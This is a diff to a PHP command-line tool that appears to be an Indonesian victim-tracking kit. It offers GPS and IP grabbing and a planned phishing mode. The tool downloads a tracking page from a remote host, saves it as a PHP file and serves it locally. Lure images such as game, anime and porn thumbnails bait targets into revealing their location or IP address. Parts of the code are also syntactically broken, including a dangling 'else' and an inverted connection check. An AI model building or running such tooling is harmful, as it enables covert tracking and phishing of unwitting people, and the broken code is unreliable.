@@ -1,9 +1,9 @@
 <?php 
 /*
-	Author 	: DaVe.K12
+	Author 	: Dave Koagow
 	Team 	: { Anonymous }
 	Tools 	: Information Gathering
-	Fanspage: https://www.facebook.com/
+	Fanspage: https://www.facebook.com/id.profile
 				{ OpenSourceCode }
 */
 /*
@@ -11,14 +11,17 @@
 */
 $version 	= '1.0.19';
 $random 	= rand(123456789, 6);
-$url 		= 'https://www.ScriptHacking12.com/index/';
+$file 		= '';
+$url 		= 'https://brad.josebernard.com/index/';
 error_reporting(0);
+// cek update
+function updated($version, $file)
 {
-	$cek = file_get_contents('https://www.ScriptHacking12.com/index/version.lst');
+	$cek = file_get_contents('https://brad.josebernard.com/index/version.lst');
 	$cek2 = explode("\n", $cek);
 	if ($cek2[0] == $version) {
 		echo "\n[-] Tidak Ada Pembaruan \n\n";
-	}
+	}else
 }
 // cek koneksi
 echo "\n[+] Mengecek Koneksi Internet ...";
@@ -26,6 +29,8 @@ $cek = get_headers('https://facebook.com');
 if (!preg_match('/200/', $cek[0])) {
 	
 	echo "\n[+] Koneksi Stabil";
+	echo "\n[+] Pembaruan ...";
+	updated($version, $file);
 }else{
 	echo "\n\n[-] Tidak Ada Koneksi Internet :'( \n\n";
 	exit();
@@ -39,9 +44,9 @@ function tampil()
   | || | | |  _| (_) | |_| | (_| | |_| | | |
  |___|_| |_|_|  \___/ \____|\__,_|\__|_| |_| v.".$version."
        => Information Gathering <=                                        
-Author   : Dave Kgw => */- Anonymous -/*
+Author   : DaVe Kgw => { Anonymous }
 Contact  : 0896 Sisanya Cari Sendiri - daveamben4@gmail.com
-FansPage : https://https://www.facebook.com/ld.profile1000098661657117
+FansPage : https://www.facebook.com/id.profile
 	--GPS  --IP  --PHISING
  > ";
 }
@@ -65,15 +70,15 @@ function download($random, $url, $opt, $port)
 	curl_setopt($curl, CURLOPT_HEADER, false);
 	$data = curl_exec($curl);
 	curl_close($curl);
-	echo "\n[+] Tunggu ";
+	echo "\n[+] Downloading ";
 	touch($opt.'_TRACK_'.$random.'.php');
 	$fp = fopen($opt.'_TRACK_'.$random.'.php', 'w');
 	fwrite($fp, $data);
 	fclose($fp);
 	echo "\n[+] Membuka File...";
-	echo "\n\n[+] Buka Browser => : https://m.facebook.com/login/:".$port;
-	// run di facebook.com
-	system('php -S facebook.com:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
+	echo "\n\n[+] Buka Browser => : http://localhost:".$port;
+	// run di localhost
+	system('php -S localhost:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
 }
 tampil();
 $pilih = trim(fgets(STDIN));
@@ -84,12 +89,12 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 	echo "[+] Set PORT  => : ";
 	$port = trim(fgets(STDIN));
 	if (is_numeric($port)) {
-		echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
+		echo "\n(1) Hacking (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
 		echo "[+] Use Image => : ";
 		$opsi_img = trim(fgets(STDIN));
 		switch ($opsi_img) {
 			case '1':
-				$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
+				$img = 'https://s.kaskus.id/r540x540/images/2018/05/27/10160369_201805270238430919.jpg';
 				break;
 			case '2':
 				$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
@@ -135,12 +140,12 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 }elseif($pilih == '--IP' || $pilih == '--ip'){
 	proses($random);
 	$input = trim(fgets(STDIN));
-	echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
+	echo "\n(1) Hacking (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
 	echo "[+] Use Image => : ";
 	$opsi_img = trim(fgets(STDIN));
 	switch ($opsi_img) {
 		case '1':
-			$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
+			$img = 'https://s.kaskus.id/r540x540/images/2018/05/27/10160369_201805270238430919.jpg';
 			break;
 		case '2':
 			$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
@@ -181,7 +186,7 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 		sleep(3);
 	}
 }elseif($pilih == '--PHISING'){
-	echo "\n\n[-] Tunggu Update Terbaru Dari Dave !!! \n\n";
+	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
 }elseif($pilih == 'exit'){
 	exit();
 }else{
